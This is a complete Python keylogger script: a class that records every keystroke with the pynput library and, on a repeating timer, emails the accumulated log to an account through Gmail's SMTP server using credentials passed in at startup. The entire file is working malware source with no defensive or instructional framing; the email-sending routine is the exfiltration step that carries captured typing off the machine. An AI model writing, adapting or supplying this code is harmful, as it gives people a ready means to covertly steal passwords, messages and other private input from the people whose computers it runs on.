#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email  # this will be used both as the sender and recipient
        self.password = password

    # Keeps log of key strokes 
    def append_to_log(self, string):
        self.log = self.log + string

    # Processes the keys entered, accounting for the space key
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # Defines the reporting of keylogged data to email feature
    def report(self):
        self.send_email("\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval , self.report)
        timer.start()

    # Sets up emailing functionality using the updated format
    def send_email(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)  # use the credentials provided during initialization
        subject = "Key Logger Message"
        full_message = 'Subject: {}\n\n{}'.format(subject, message)
        server.sendmail(self.email, self.email, full_message)  # using the provided email as both sender and recipient
        server.quit()

    # Starts the keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()